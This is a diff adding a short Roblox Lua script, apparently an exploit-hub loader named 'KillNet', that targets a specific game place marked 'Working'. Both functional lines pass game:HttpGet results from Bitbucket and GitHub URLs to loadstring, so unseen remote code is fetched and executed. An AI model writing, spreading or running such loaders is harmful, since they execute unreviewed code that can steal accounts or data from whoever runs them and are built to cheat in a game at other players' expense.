@@ -1,0 +1,13 @@
+local Library = loadstring(game:HttpGet("https://bitbucket.org/cat__/uis/raw/Loady/Module"), "Loady")()
+local Window = Library:Window("KillNet", function(Script, Func)
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/DemogorgonItsMe/nothing/main/w'),true))()
+end, {
+    Translate = false
+})
+
+Window:Game({
+    Place = 4169490976,
+    Status = "Working",
+    Script = "A"
+})
+Window:Initiate()
